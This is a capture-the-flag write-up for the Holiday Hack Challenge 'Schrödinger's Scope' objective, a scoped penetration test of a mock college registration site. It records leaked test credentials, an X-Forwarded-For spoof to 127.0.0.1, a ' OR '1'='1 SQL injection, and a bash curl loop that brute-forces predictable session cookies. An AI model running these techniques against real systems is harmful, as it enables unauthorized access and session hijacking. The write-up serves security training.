---
layout: default
title: act3_schrodingersscope_mjd
nav: |
  <table>
  <thead>
  <tr>
  <th><a href="/HHC_2025/act3_snowcat_mjd.html">Previous Objective: Act3 Snowcat RCE and Privilege Escalation</a></th>
  <th><a href="/HHC_2025/index.html">Table of Contents</a></th>
  <th><a href="/HHC_2025/act3_snowglobe_mjd.html">Next Objective: Act3 Find and Shutdown Frosty's Snowglobe Machine</a></th>
  </tr>
  </thead>
  <tbody>
  </tbody>
  </table>
---
<table>
<thead>
<tr>
<th>Objective: Schrödinger's Scope</th>
<th>Difficulty Level: 3</th>
</tr>
</thead>
<tbody>
<tr>
<td>Kevin in the Retro Store ponders pentest paradoxes-can you solve Schrödinger's Scope?</td>
<td>Location: Retro Store</td>
</tr>
</tbody>
</table>
<p>
<h2>Solution Overview</h2>
<br>
</p>
<p>
The objective is to conduct a penetration test of a Neighborhood College Registration system. The test is scoped to a specific path of the application, accessing other paths is limited by an active monitoring system. When a threshold is reached, the engagement is reset. This resets the cookies that track the session and achievements. When this occurs, any vulnerabilities achieved are no longer logged and must be redone. The testing begins with reconnaisance of the application. Vulnerabilities are tested and exploited if possible.
<br>
</p>
<table>
<thead>
<tr>
<th>Activity</th>
<th>Primary Tactic</th>
<th>MITRE ATT&CK Technique ID</th>
<th>MITRE ATT&CK Technique Name</th>
</tr>
</thead>
<tbody>
<tr>
<td>Developer information disclosure</td>
<td>Reconnaissance</td>
<td>T1592.004</td>
<td>Gather Credentials</td>
</tr>
<tr>
<td>X-Forwarded-For exploit</td>
<td>Initial Access</td>
<td>T1190</td>
<td>Exploit Public-Facing Application</td>
</tr>
<tr>
<td>Found commented code</td>
<td>Reconnaissance</td>
<td>T1595.002</td>
<td>Vulnerability Scanning</td>
</tr>
<tr>
<td>SQL Injection</td>
<td>Initial Access</td>
<td>T1190</td>
<td>Exploit Public-Facing Application</td>
</tr>
<tr>
<td>Unauthorized content</td>
<td>Discovery</td>
<td>T1083</td>
<td>File and Directory Discovery</td>
</tr>
<tr>
<td>Cookie prediction</td>
<td>Credential Access</td>
<td>T1539</td>
<td>Steal Web Session Cookie</td>
</tr>
</tbody>
</table>
<p>
<h2>Detailed Solution</h2>
<br>
</p>
<details>

<summary>Click to expand</summary>
<br>

<p>
The initial step was to identify the bot responsible for the additional scope violations
<br>
</p>
<p>
<img src="/HHC_2025/images/shroedingers_webbot.jpg" alt="Identification of WebBot">
<br>
</p>
<p>
With the object pattern identified, it is possible to use browser Developer Tools to block the request.
<br>
Selecting "Network Request Blocking" from the More Tools menu. The pattern to block is "<em>gnomeU</em>"
<br>
</p>
<p>
<img src="/HHC_2025/images/shroedingers_webbotblock.jpg" alt="Blocking of WebBot">
<br>
</p>
<p>
Reconnaisance began with examining the contents of the sitemap for the application.
<br>
The sitemap was located at: flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/sitemap/?id=2328f6ee-8810-4052-aa3d-f5c75b5cb934
<br>
</p>
<pre><code class="language-">
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/admin
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/admin
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/admin/console
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/admin/console
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/admin/logs
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/admin/logs
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/auth
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/auth
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/auth/register
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/auth/register
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/auth/register/login
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/auth/register/login
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/login
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/login
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/reset
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/reset/
>http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/sitemap
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/sitemap/
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/status_report
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/status_report/
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/search
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/search/
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/search/student_lookup
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/search/student_lookup
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/dev
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/dev/
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/dev/dev_notes
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/dev/dev_notes/
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/dev/dev_todos
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/dev/dev_todos/
</code></pre>
<p>
Exploring the endpoints revealed several pages of notes, two that were within the scope.
<br>
The first enpoint found: /register/dev/dev_todos
<br>
</p>
<p>
<img src="/HHC_2025/images/shroedingers_devtodos.jpg" alt="Developer Information To Do List">
<br>
</p>
<p>
The second endpoint found: /register/dev/dev_notes
<br>
</p>
<p>
<img src="/HHC_2025/images/shroedingers_devnotes.jpg" alt="Developer Information Notes">
<br>
</p>
<p>
Locating both of these files construct the Developer information disclosure vulnerability discovered.
<br>
</p>
<p>
<strong>Answer: Developer information disclosure</strong>
<br>
</p>
<p>
With the information the developer left behind, it is possible to attack the login page. Providing the credentials from the note results in an Invalid Forwarding IP error. The X-Forwarded-For header is meant to preserve the true client IP across proxies. But because it can be manually set by clients, it’s vulnerable to spoofing. To bypass this error, we will set the header to 127.0.0.1 in an attempt to trick the web server into believing the request originated from itself.
<br>
</p>
<p>
<img src="/HHC_2025/images/shroedingers_xforwarder.jpg" alt="Spoofing the X-Forwarder Header">
<br>
</p>
<p>
The login "testuser" with the password "2025h0L1d4y5" succeeds, and the /register/courses node is now accessible.
<br>
</p>
<p>
Spoofing the X-Forwarded-For header and authenticating as testuser achieves the second vulnerability.
<br>
</p>
<p>
<strong>Answer: X-Forwarded-For exploit</strong>
<br>
</p>
<p>
Examining the source code for the courses page, a commented secion of code is discovered.
<br>
</p>
<p>
<img src="/HHC_2025/images/shroedingers_commentedsearch.jpg" alt="Commented Search Feature">
<br>
</p>
<p>
Using a snippet of code from the register/js/registerCourses.js in the developer console this feature can be enabled:
<br>
</p>
<pre><code class="language-js">
function checkAndReportCourseSearch() {
  const courseList = document.getElementById('courseSearch');
  if (courseList && !courseList.dataset.trapTriggered) {
    courseList.dataset.trapTriggered = "true";
    fetch('/register/courseSearchUnlocked', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        message: 'Course search was uncommented!',
        timestamp: Date.now(),
        linkCount: courseList.querySelectorAll('a').length
      })
    })
</code></pre>
<p>
Executing the following code in the Developer Console activates the code:
<br>
</p>
<pre><code class="language-js">
fetch('/register/courseSearchUnlocked', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ message: 'Course search was uncommented!', timestamp: Date.now(), linkCount: 1 }) }).then(r => r.text()).then(console.log)
</code></pre>
<p>
This activates the search feature in the application:
<br>
</p>
<p>
<img src="/HHC_2025/images/shroedingers_activatedsearch.jpg" alt="Activated Search Feature">
<br>
</p>
<p>
<strong>Answer: Found commented code</strong>
<br>
</p>
<p>
Testing the search interface for SQL Injection (SQLi), the application was found to be vulnerable.  An OR injection (' OR '1'='1) was utilized to list all course entries in the database.
<br>
</p>
<p>
<img src="/HHC_2025/images/shroedingers_searchsqli.jpg" alt="Search SQL Injection">
<br>
</p>
<p>
<strong>Answer: SQL Injection</strong>
<br>
</p>
<p>
This reveals the unauthorized course and allows me to report it:
<br>
<img src="/HHC_2025/images/shroedingers_mischief.jpg" alt="Unauthorized Course">
<br>
</p>
<p>
Opening the course details prompts for reporting:
<br>
<img src="/HHC_2025/images/shroedingers_gnomecourse.jpg" alt="Unauthorized Course Details">
<br>
</p>
<p>
<strong>Answer: Unauthorized content</strong>
<br>
</p>
<p>
The final hint suggests that a token or cookie may be weak. The error message when attempting to access the wip/holiday_behavior endpoint confirms this idea.
<br>
</p>
<p>
<img src="/HHC_2025/images/shroedingers_wipermissions.jpg" alt="Registration Value">
<br>
</p>
<p>
Looking at the registration values generated:
<br>
</p>
<pre><code class="language-">
registration	eb72a05369dcb44d
registration	eb72a05369dcb44d
registration	eb72a05369dcb455
registration	eb72a05369dcb453
registration	eb72a05369dcb451
registration	eb72a05369dcb454
registration	eb72a05369dcb444
registration	eb72a05369dcb445
registration	eb72a05369dcb447
registration	eb72a05369dcb449
registration	eb72a05369dcb456
registration	eb72a05369dcb448
registration	eb72a05369dcb452
registration	eb72a05369dcb44a
registration	eb72a05369dcb443
</code></pre>
<p>
Only the last two digits change, this indicates there are only 256 variations.
<br>
The TestUser needs to be logged in to test the registration values.
<br>
Using this script to locate the valid session:
<br>
</p>
<pre><code class="language-sh">
#!/bin/bash
prefix="eb72a05369dcb4"
schrod="7c3ee3a7-6781-459b-8db9-eee63c05558b"
id="48dd96c0-0794-41cf-96c1-bf3ddc555a30"
for i in {0..255}; do
  hex=$(printf '%02x' $i)
# Login and access page in one flow
  response=$(curl -s -L \
    -H "X-Forwarded-For: 127.0.0.1" \
    -H "Cookie: Schrodinger=$schrod; registration=${prefix}${hex}" \
    -d "username=teststudent&password=2025h0L1d4y5" \
    "https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/login?id=$id" \
    --next \
    -H "X-Forwarded-For: 127.0.0.1" \
    -H "Cookie: Schrodinger=$schrod; registration=${prefix}${hex}" \
    "https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/courses/wip/holiday_behavior?id=$id")
  if ! echo "$response" | grep -qi "invalid"; then
    echo "============================================"
    echo "VALID REGISTRATION COOKIE FOUND!"
    echo "registration=${prefix}${hex}"
    echo "============================================"
    echo ""
    echo "$response"
    echo ""
    echo "============================================"
    echo "Response saved to: /tmp/valid_${hex}.html"
    echo "$response" > /tmp/valid_${hex}.html
    exit 0
  else
    echo -n "."
  fi
done
echo ""
echo "No valid registration cookie found in range 00-ff"
</code></pre>
<p>
This results in a VALID REGISTRATION COOKIE FOUND!
<br>
registration=eb72a05369dcb44c
<br>
</p>
<p>
Hijacking this session token, the document in wip is accessed.
<br>
</p>
<p>
<strong>Answer: Cookie prediction</strong>
<br>
</p>
<p>
<img src="/HHC_2025/images/shroedingers_final.jpg" alt="Final Assessment Results">
<br>
</p>
</details>
<p>
<h2>Tools Reference</h2>
<br>
</p>
<table>
<thead>
<tr>
<th>Tools Used</th>
<th>Tool Version</th>
</tr>
</thead>
<tbody>
<tr>
<td>Edge Developer Tools</td>
<td>Version 142.0.3595.53</td>
</tr>
<tr>
<td>Burp Suite Community Edition</td>
<td>v2024.11.2</td>
</tr>
<tr>
<td>Bash</td>
<td>v5.2.37(1)-release (x86_64-pc-linux-gnu)</td>
</tr>
</tbody>
</table>
<p>
<h2>Hints Reference</h2>
<br>
</p>
<table>
<thead>
<tr>
<th>Provided By</th>
<th>Hint</th>
</tr>
</thead>
<tbody>
<tr>
<td>Santa</td>
<td>Though it might be more interesting to start off trying clever techniques and exploits, always start with the simple stuff first, such as reviewing HTML source code and basic SQLi.</td>
</tr>
<tr>
<td>Santa</td>
<td>Watch out for tiny, pesky gnomes who may be violating your progess. If you find one, figure out how they are getting into things and consider matching and replacing them out of your way.</td>
</tr>
<tr>
<td>Santa</td>
<td>As you test this with a tool like Burp Suite, resist temptations and stay true to the instructed path.</td>
</tr>
<tr>
<td>Santa</td>
<td>During any kind of penetration test, always be on the lookout for items which may be predictable from the available information, such as application endpoints. Things like a sitemap can be helpful, even if it is old or incomplete. Other predictable values to look for are things like token and cookie values</td>
</tr>
<tr>
<td>Santa</td>
<td>Pay close attention to the instructions and be very wary of advice from the tongues of gnomes! Perhaps not ignore everything, but be careful!</td>
</tr>
<tr>
<td>Kevin</td>
<td>The Neighborhood College Course Registration System has been getting some updates lately and I'm wondering if you might help me improve its security by performing a small web application penetration test of the site. For any web application test, one of the most important things for the test is the 'scope', that is, what one is permitted to test and what one should not. While hacking is fun and cool, professional integrity means respecting scope boundaries, especially when there are tempting targets outside our permitted scope. Thankfully, the Neighborhood College has provided a very concise set of 'Instructions' which are accessible via a link provided on the site you will be testing. Do not overlook or dismiss the instructions! Following them is key to successfully completing the test. Unfortunately, those pesky gnomes have found their way into the site and have been causing some mischief as well. Be wary of their presence and anything they may have to say as you are testing. Can you help me demonstrate to the Neighborhood College that we know what responsible penetration testing looks like?</td>
</tr>
</tbody>
</table>
<p>
<h2>Acknowledgements</h2>
<br>
</p>
<table>
<thead>
<tr>
<th>Provided By</th>
<th>Notes</th>
</tr>
</thead>
<tbody>
<tr>
<td>khesperus</td>
<td>Provided a sanity check by confirming that I had all the elements to solve the objective</td>
</tr>
<tr>
<td>eucrates</td>
<td>Provided feedback on scope and avoiding rabbit holes</td>
</tr>
</tbody>
</table>
